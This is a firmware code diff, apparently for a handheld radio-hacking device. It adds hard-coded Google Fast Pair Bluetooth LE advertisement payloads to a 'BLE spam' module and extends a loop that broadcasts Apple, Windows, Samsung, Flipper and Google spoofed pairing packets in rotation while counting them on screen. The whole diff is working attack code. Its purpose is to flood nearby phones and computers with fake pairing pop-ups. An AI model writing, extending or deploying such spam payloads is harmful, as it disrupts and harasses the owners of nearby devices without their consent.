@@ -894,6 +894,34 @@ void ble_spam_samsung(void)
 
 
 /*============================================================================*/
+/*  Google Fast Pair — Android device pairing notifications                  */
+/*============================================================================*/
+
+static const uint8_t google_fastpair_payloads[][31] = {
+    { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
+      0x06, 0x16, 0x2C, 0xFE, 0xCD, 0x82, 0x1C },
+    { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
+      0x06, 0x16, 0x2C, 0xFE, 0xD9, 0x46, 0x3C },
+    { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
+      0x06, 0x16, 0x2C, 0xFE, 0xF0, 0x00, 0x02 },
+    { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
+      0x06, 0x16, 0x2C, 0xFE, 0x72, 0xFB, 0x00 },
+    { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
+      0x06, 0x16, 0x2C, 0xFE, 0xA7, 0xA6, 0xB8 },
+    { 0x02, 0x01, 0x06, 0x03, 0x03, 0x2C, 0xFE,
+      0x06, 0x16, 0x2C, 0xFE, 0x05, 0xA9, 0x63 },
+};
+static const uint8_t google_fastpair_lens[] = { 14, 14, 14, 14, 14, 14 };
+
+void ble_spam_google_fastpair(void)
+{
+    ble_ensure_esp32_ready();
+    ble_spam_run_loop("GOOGLE FP",
+        google_fastpair_payloads, google_fastpair_lens, 6);
+}
+
+
+/*============================================================================*/
 /*  Flipper BLE Spam — name advertisements                                   */
 /*============================================================================*/
 
@@ -937,28 +965,33 @@ void ble_spam_all(void)
     while (1)
     {
         uint8_t sent_type = type_idx;
+        uint8_t sent = ble_spam_payload_count(sent_type);
 
         switch (type_idx)
         {
         case 0:
-            for (uint8_t i = 0; i < 4; i++)
+            for (uint8_t i = 0; i < sent; i++)
                 ble_raw_adv_send(sour_apple_payloads[i], sour_apple_lens[i]);
             break;
         case 1:
-            for (uint8_t i = 0; i < 4; i++)
+            for (uint8_t i = 0; i < sent; i++)
                 ble_raw_adv_send(swiftpair_payloads[i], swiftpair_lens[i]);
             break;
         case 2:
-            for (uint8_t i = 0; i < 4; i++)
+            for (uint8_t i = 0; i < sent; i++)
                 ble_raw_adv_send(samsung_payloads[i], samsung_lens[i]);
             break;
         case 3:
-            for (uint8_t i = 0; i < 4; i++)
+            for (uint8_t i = 0; i < sent; i++)
                 ble_raw_adv_send(flipper_payloads[i], flipper_lens[i]);
             break;
+        case 4:
+            for (uint8_t i = 0; i < sent; i++)
+                ble_raw_adv_send(google_fastpair_payloads[i], google_fastpair_lens[i]);
+            break;
         }
-        type_idx = (type_idx + 1) % 4;
-        pkt_count += 4;
+        type_idx = (type_idx + 1) % 5;
+        pkt_count += sent;
 
         uint32_t elapsed = (HAL_GetTick() - start_tick) / 1000;
 
@@ -974,7 +1007,7 @@ void ble_spam_all(void)
         snprintf(ln, sizeof(ln), "Packets: %lu", pkt_count);
         u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += 9;
 
-        const char *names[] = {"Apple", "Windows", "Samsung", "Flipper"};
+        const char *names[] = {"Apple", "Windows", "Samsung", "Flipper", "Google"};
         snprintf(ln, sizeof(ln), "Current: %s", names[sent_type]);
         u8g2_DrawStr(&m1_u8g2, 2, y, ln); y += 9;
 
